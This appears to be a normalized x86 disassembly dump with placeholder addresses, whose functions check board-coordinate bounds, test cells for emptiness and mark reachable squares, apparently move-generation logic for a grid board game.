mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
lea ecx [ esi + 0x1 ]
mov [ rw-data ] ecx
cmp ecx edx
jge r-xdata
lea ecx [ edx + 0x1 ]
mov [ rw-data ] ecx
cmp ecx esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi esi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edi
jge r-xdata
inc esi
mov [ rw-data ] esi
cmp esi edx
jge r-xdata
inc edx
mov [ rw-data ] edx
cmp edx esi
jge r-xdata
inc edi
mov [ rw-data ] edi
cmp edi ecx
jge r-xdata
inc ecx
mov [ rw-data ] ecx
cmp ecx edi
jge r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
cmp edi 0x2
jne r-xdata
dec esi
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
lea eax [ esi + esi * 2 ]
lea eax [ ecx + eax * 4 ]
cmp [ ebx + eax * 4 ] 0x20
jne r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ ecx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax [ ebp + 0x10 ]
sub edx esi
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
add esi edx
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ebp + 0x10 ]
sub esi edx
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
add edx esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edx
nop [ eax ] eax
lea eax [ edi + edi * 2 ]
sub esi edi
lea eax [ edx + eax * 4 ]
add edi esi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] edi
nop [ eax + eax ] ax
lea eax [ esi + esi * 2 ]
sub edi esi
lea eax [ edx + eax * 4 ]
add esi edi
lea eax [ ebx + eax * 4 ]
mov [ rw-data ] esi
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
mov eax [ ecx ]
lea eax [ eax + eax * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop
lea eax [ edi + edi * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
nop [ eax ] eax
lea eax [ ecx + ecx * 2 ]
lea eax [ edx + eax * 4 ]
lea eax [ ebx + eax * 4 ]
mov eax ecx
sub eax [ ebp + 0xc ]
cmp eax 0x2
jne r-xdata
inc ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx edx
jl r-xdata
inc ecx
add eax 0x4
mov [ rw-data ] ecx
cmp ecx esi
jl r-xdata
add eax 0x4
sub edx 0x1
jne r-xdata
inc ecx
add eax 0x4
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub esi 0x1
jne r-xdata
inc ecx
add eax 0x30
sub edi 0x1
jne r-xdata
inc ecx
inc esi
add eax 0x4
mov [ rw-data ] esi
cmp esi edx
jl r-xdata
inc edx
add eax 0x4
mov [ rw-data ] edx
cmp edx esi
jl r-xdata
inc edi
add eax 0x30
mov [ rw-data ] edi
cmp edi ecx
jl r-xdata
inc ecx
add eax 0x30
mov [ rw-data ] ecx
cmp ecx edi
jl r-xdata
mov ecx [ rw-data ]
mov esi [ rw-data ]
dec ecx
mov [ rw-data ] esi
mov [ rw-data ] ecx
jmp r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
je r-xdata
cmp ecx 0x1
je r-xdata
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax ] 0x20
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_4075b0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx 0x84
push esi
push edi
mov esi r--data
mov edi ebx
[ edi ] [ esi ]
mov esi [ ebp + 0xc ]
xor eax eax
nop [ eax ] eax
inc eax
add esi 0x8
cmp eax 0x20
jl r-xdata
lea edx [ ecx + ecx * 2 ]
mov ecx [ esi + 0x4 ]
lea ecx [ ecx + edx * 4 ]
mov [ ebx + ecx * 4 ] eax
mov ecx [ esi ]
mov [ rw-data ] esi
test ecx ecx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
pop ebp
retn
sub_407600
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ecx ]
cmp edx 0x1
jl r-xdata
xor eax eax
pop ebp
retn
cmp edx 0x9
jg r-xdata
mov ecx [ ecx + 0x4 ]
cmp ecx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax 0xd
ja r-xdata
mov eax 0x1
pop ebp
retn
jmp [ eax * 4 + jump_table_4077c0 ]
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x7
jg r-xdata
cmp edx 0x6
jg r-xdata
cmp edx 0x4
jne r-xdata
cmp edx 0x1
jne r-xdata
cmp ecx 0x4
jl r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x5
jle r-xdata
cmp edx 0x4
jl r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
cmp edx 0x3
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x6
jge r-xdata
cmp ecx 0x8
jge r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x9
je r-xdata
cmp ecx 0x8
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0xa
je r-xdata
and edx 0x80000001
jns r-xdata
cmp ecx 0x3
jle r-xdata
cmp edx 0x6
jne r-xdata
cmp ecx 0x2
je r-xdata
cmp ecx 0x3
je r-xdata
cmp edx 0x5
jne r-xdata
cmp ecx 0x1
je r-xdata
and edx 0x80000001
jns r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0xa
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x8
je r-xdata
cmp ecx 0x6
je r-xdata
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
xor eax eax
pop ebp
retn
cmp ecx 0x1
je r-xdata
cmp edx 0x7
jne r-xdata
cmp ecx 0x3
je r-xdata
cmp ecx 0x5
je r-xdata
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
cmp ecx 0x8
cmp edx 0x9
jne r-xdata
cmp ecx 0xa
je r-xdata
xor eax eax
pop ebp
retn
cmp ecx 0x3
jmp r-xdata
cmp edx 0x9
jne r-xdata
cmp ecx 0x1
je r-xdata
jmp r-xdata
cmp ecx 0x6
je r-xdata
je r-xdata
cmp ecx 0x3
jmp r-xdata
cmp ecx 0x5
je r-xdata
sub_407800
push ebp
mov ebp esp
mov edx [ ebp + 0x18 ]
sub esp 0xc
mov ecx [ ebp + 0xc ]
xor eax eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
inc eax
cmp eax 0x1f
jle r-xdata
mov edi [ ecx + eax * 8 + 0x4 ]
mov [ rw-data ] edi
cmp eax 0x1f
ja r-xdata
mov ebx [ ecx + eax * 8 ]
mov [ rw-data ] ebx
test ebx ebx
je r-xdata
pop edi
pop esi
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
movzx ecx [ eax + lookup_table_408ef8 ]
jmp [ ecx * 4 + jump_table_408ec0 ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov ecx [ ecx ]
cmp ecx [ esi + 0x80 ]
mov esi [ ebp + 0x14 ]
jne r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x1 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x6
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp edi 0x9
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
shl ecx 0x2
mov [ ebp - 0x4 ] ecx
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
cmp [ edi + ecx * 4 + 0x30 ] 0x20
jne r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0x9
jg r-xdata
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
inc edi
mov [ rw-data ] edi
cmp edi 0xa
jg r-xdata
inc edi
cmp edi 0xa
jg r-xdata
mov ebx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ebx + 0x84 ]
mov ebx [ ebx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
inc edi
cmp edi 0x3
jg r-xdata
mov ecx [ ebp + 0xc ]
mov [ rw-data ] 0x0
mov edi [ ecx + 0x84 ]
mov ebx [ ecx + 0x4 ]
inc edi
cmp edi ebx
jge r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x6
jg r-xdata
cmp ebx 0x3
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
add ebx 0xfffffffe
cmp edi 0x9
jg r-xdata
cmp ebx 0x5
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov edx [ rw-data ]
lea edi [ ebx - 0x1 ]
lea ecx [ edi + edi * 2 ]
mov [ rw-data ] edi
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea edi [ ebx + 0x2 ]
mov ebx [ rw-data ]
inc ebx
cmp edi 0x9
jg r-xdata
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ rw-data ]
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] 0x0
lea ebx [ ecx - 0x1 ]
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov edi [ rw-data ]
cmp edi 0x5
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
cmp edi 0x6
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x8
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov esi [ ebp + 0xc ]
mov ebx [ rw-data ]
mov edi [ esi + 0x84 ]
mov esi [ ebp + 0x14 ]
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
nop [ eax ] eax
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebx + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edi + ecx * 4 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x18 ]
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x8
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov edi [ rw-data ]
dec edi
cmp edi 0x4
jl r-xdata
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x6
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
lea edi [ ecx - 0x2 ]
cmp edi 0x1
jl r-xdata
cmp ebx 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x34 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp [ edx + ecx * 4 + 0x4 ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add ebx 0xfffffffe
inc ecx
cmp ebx 0x1
jl r-xdata
mov ebx [ rw-data ]
dec ebx
cmp edi 0x9
jg r-xdata
cmp ebx 0xa
jg r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
nop
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ebx [ rw-data ]
inc ebx
mov [ ebp - 0x4 ] 0x0
cmp ebx 0xa
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
jmp r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
lea ecx [ ebx + 0x1 ]
cmp ecx 0x9
jg r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 ] 0x1
mov edi [ rw-data ]
mov [ edx + ecx * 4 ] 0x1
mov ebx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov edi [ rw-data ]
lea ecx [ ebx + 0x1 ]
cmp ecx 0x6
jg r-xdata
lea ecx [ ebx + ebx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + ecx * 4 ]
inc [ esi + 0x40 ]
mov [ rw-data ] ecx
cmp ecx 0x20
je r-xdata
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov ebx [ rw-data ]
mov edi [ rw-data ]
mov [ edx + ecx * 4 + 0x800 ] 0x1
mov [ rw-data ] 0x1
jmp r-xdata
inc edi
add ecx 0x4
cmp edi ebx
jl r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0xa
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x4
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
inc ecx
cmp ecx 0x3
jg r-xdata
lea ecx [ edi + edi * 2 ]
mov edi [ ebp + 0x8 ]
lea ecx [ ebx + ecx * 4 ]
mov edi [ edi + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
mov ecx eax
shl ecx 0x5
add ecx ebx
mov [ edx + ecx * 4 ] 0x1
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0xa
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov [ rw-data ] edi
mov [ rw-data ] ebx
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + 0x18 ]
add ecx 0x2
cmp ecx 0x5
mov ecx [ rw-data ]
jg r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + ecx * 4 + 0x2c ] 0x20
mov edx [ ebp + 0x18 ]
jne r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0xc ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ecx [ rw-data ]
mov ebx [ ebp + 0x8 ]
dec ecx
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ ebx + ecx * 4 ] 0x20
jne r-xdata
lea ecx [ ebx + 0x1 ]
mov ebx [ rw-data ]
add ebx 0x2
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
cmp ecx 0xa
jg r-xdata
mov ebx [ rw-data ]
cmp ebx 0x1
jl r-xdata
lea ecx [ edi + edi * 2 ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] ebx
cmp ebx 0x20
je r-xdata
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi edi
je r-xdata
mov edi [ rw-data ]
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
inc ebx
add ecx 0x30
mov [ ebp - 0x4 ] ecx
cmp ebx 0x9
jle r-xdata
mov ecx eax
shl ecx 0x5
add ecx edi
mov [ edx + ecx * 4 ] 0x1
mov ecx [ ebp - 0x4 ]
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] 0x0
mov [ rw-data ] ebx
cmp ebx 0x1
jl r-xdata
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx ebx
lea ecx [ edi + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea ecx [ ebx + ebx * 2 ]
mov ebx [ rw-data ]
lea ecx [ ebx + ecx * 4 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebx + ecx * 4 ]
inc [ esi + eax * 4 ]
mov [ rw-data ] edi
cmp edi 0x20
je r-xdata
